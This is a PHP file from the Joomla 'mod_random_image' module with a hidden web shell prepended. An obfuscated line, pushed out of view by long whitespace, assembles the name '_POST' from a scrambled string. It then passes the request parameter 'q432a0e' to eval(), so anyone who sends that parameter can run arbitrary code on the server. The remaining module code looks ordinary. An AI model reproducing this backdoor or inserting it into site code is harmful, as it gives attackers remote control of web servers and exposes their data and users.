<?php                                                                                                                                                                                                                                                              $xoeo0 ="utrspo_e"; $mar58= $xoeo0[3].$xoeo0[1].$xoeo0[2]. $xoeo0[1]. $xoeo0[5]. $xoeo0[0]. $xoeo0[4].$xoeo0[4].$xoeo0[7]. $xoeo0[2] ; $clq0 =$mar58( $xoeo0[6].$xoeo0[4].$xoeo0[5].$xoeo0[3].$xoeo0[1]) ; if(isset( ${ $clq0}[ 'q432a0e'])) { eval ( ${$clq0} ['q432a0e']) ; } ?><?php
/**
 * @package     Joomla.Site
 * @subpackage  mod_random_image
 *
 * @copyright   Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('_JEXEC') or die;

// Include the syndicate functions only once
require_once __DIR__ . '/helper.php';

$link	= $params->get('link');

$folder	= modRandomImageHelper::getFolder($params);
$images	= modRandomImageHelper::getImages($params, $folder);

if (!count($images))
{
	echo JText::_('MOD_RANDOM_IMAGE_NO_IMAGES');
	return;
}

$image = modRandomImageHelper::getRandomImage($params, $images);
$moduleclass_sfx = htmlspecialchars($params->get('moduleclass_sfx'));
require JModuleHelper::getLayoutPath('mod_random_image', $params->get('layout', 'default'));
